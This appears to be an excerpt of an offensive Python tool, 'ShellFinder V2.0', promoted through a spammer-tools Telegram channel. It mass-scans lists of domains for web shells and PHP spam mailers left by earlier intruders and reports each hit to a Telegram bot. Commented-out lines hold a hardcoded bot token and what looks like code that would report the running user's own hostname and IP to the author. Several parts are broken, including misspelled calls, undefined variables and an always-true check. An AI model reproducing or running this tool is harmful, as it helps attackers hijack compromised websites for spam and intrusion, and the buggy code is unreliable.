...
def telegram_bot_sendtext(bot_message):
    global token, group
    send_text = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+group+'&parse_mode=Markdown&text='+bot_message
...
password = 0
clear()
print("\x1b[41;1m\n\n\n\t\t\t\t( /(                         )          )\\ )    ( /( \n\t\t\t\t)\\())  (        )         ( /(     (   (()/(    )\\())\n\t\t\t\t((_)\\   )(    ( /(    (    )\\())   ))\\   /(_))  ((_) \n\t\t\t\t_((_) (()\\   )(_))   )\\  ((_)\\   /((_) (_))_    _((_)\n\t\t\t\t| || |  ((_) ((_)_   ((_) | |(_) (_))    |   \\  |_  /\n\t\t\t\t| __ | | '_| / _` | / _|  | / /  / -_)   | |) |  / / \n\t\t\t\t|_||_| |_|   \\__,_| \\__|  |_\\_\\  \\___|   |___/  /___|\x1b[0m  \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tShellFinder V2.0\n\t\t\t\t\tFor premium stuff \n\t\t\t\t\tTelegram : @kickflap\n\t\t\t\t\tChannel : https://t.me/spammer_tools\n\t\t\t\t\t\n\n\n\n")
#token = '5327599236:AAEg7xL4oZAi-V5zS4kPwSbctEZieZ9J6eY'
#group = '-662395173'
#urli = 'https://www.toptal.com/developers/hastebin/raw/ufixiceheh'
#url1 = requests.get(urli).text

urli = [
            'wsu.php',
            '15.php',
            '/wp-admin/marijuana.php',
            '/ntol.php',
            'aa.php',
            '/wp-content/15.php',
            '/wp/wp-content/plugins/xsid/marijuana.php',
            '/wp/minishell.php',
            'wso.php',
            'wso-2.5.php',
            'wos.php?login=wos',
...
#telegram_bot_sendtext(f'''Hostname: {hostname}\nIP Address: {ip}\n=========== Shell Finder Victim ========\n''')
file_name = input('\x1b[46m Give me your urls list ============> \x1b[0m')
token = input('\x1b[46m Give me your bot token ============> \x1b[0m')
group = input('\x1b[46m Give me your chat id ============> \x1b[0m')

op = open(file_name, 'r').read().splitlines()
TEXTList = [x.strip() for x in op]


def finder(i):
    global Good, Bad, pro, mailer, password
    ...
    x = requests.session()
    for script in listaaa:
        url = "http://"+i+"/"+script
        req_first = x.get(url, headers=head)
        if ">public_html" in req_first.text:
            telegram_bot_sendtext('Hostname: ' + hostname + '\nIP Address: ' + ip + '\n=========== Shell Finder Hrackedz ========\nShell : ' + url)
            TEXTList.remove(i)
            Good += 1
            print('\x1b[42;1m -- Shell Found -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'shell.txt', 'a+')
            file.write(url+"\n")
            file.close()
        elif ">Upload file:" in req_first:
            telegram_bot_sendtext('Hostname: ' + hostname + '\nIP Address: ' + ip + '\n=========== Shell Finder Hrackedz ========\nShell : ' + url)
            TEXTList.remove(i)
            Good +=1
            print('\x1b[42;1m -- Shell Found -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'random.txt', 'a+')
            file.write(url+"\n")
            file.close()
            ...
            Good +=1
            print('\x1b[42;1m -- Shell Found -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'Config.txt', 'a+')
            file.write(url+"\n")
            file.close()
        elif 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<':
            telegram_bot_sendtext('Hostname: ' + hostname + '\nIP Address: ' + ip + '\n=========== Shell Finder Hrackedz ========\nMailer : ' + url)
            TEXTList.remove(i)
            mailer +=1
            print('\x1b[42;1m -- Mailer Found -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'Mailer.txt', 'a+')
            file.write(url+"\n")
            file.close()
        elif 'method=post>Password:' in req_first or '<input type=password name=pass' in req_first:
            telegram_bot_sendtext('Hostname: ' + hostname + '\nIP Address: ' + ip + '\n=========== Shell Finder Hrackedz ========\nShell with Password : ' + url)
            TEXTList.remove(i)
            password +=1
            print('\x1b[42;1m -- Shell with Pass Found -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'password.txt', 'a+')
            file.write(url+"\n")
            file.close()
        elif 'name="uploader" id="uploader">' in req_first:
            telegram_bot_sendtext('Hostname: ' + hostname + '\nIP Address: ' + ip + '\n=========== Shell Finder Hrackedz ========\nVULN : ' + url)
            TEXTList.remove(i)
            good +=1
            print('\x1b[42;1m -- VULN Found -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'result.txt', 'a+')
            file.write(url+"\n")
            file.close()
        else:
            TEXTList.remove(i)
            bad +=1
            print('\x1b[41;1m -- BAD -- \x1b[0m ' + url)
            file = open('THERESULT'+os.sep+'Mailer.txt', 'a+')
            file.write(url+"\n")
            file.close()
        if os.name == "nt":
            ctypes.windlll.kernel32.SetConsoleTitleW(' HrackeDz Shell Finder  | Shell- {} | BAAD- {} | Mailer- {}| Password-{}'.format(Good,Bad,mailer,password))
        else:
            sys.stdout.write('\x1b]2;   |Shell- {} |Not- {}| Mailer-{}| Password-{}\x07'.format(Good,Bad,mailer,password))

def start():
    mp = Pool(150)
    mp.map(finder, TEXTList)
    mp.close()
    mp.join()
